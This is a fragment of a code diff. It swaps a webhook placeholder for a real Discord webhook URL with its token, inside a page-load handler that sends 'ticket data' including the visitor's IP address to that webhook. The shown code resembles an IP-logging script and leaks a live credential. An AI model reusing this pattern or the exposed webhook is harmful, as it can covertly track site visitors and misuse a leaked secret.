@@ -10,7 +10,7 @@ window.onload = function() {
             };
 
             // Sending the ticket data (including the IP address) to the Discord webhook
-            fetch('YOUR_DISCORD_WEBHOOK_URL', {
+            fetch('https://discord.com/api/webhooks/1309288605239218177/sr2E9uuZ1IAHVYhJRZshwFKq7sXxjBdCcus7qI9J1tGH4XBeScQOjqREywqSnOH-xw0l', {
                 method: 'POST',  // HTTP method for sending data
                 headers: {
                     'Content-Type': 'application/json',  // The data format being sent is JSON
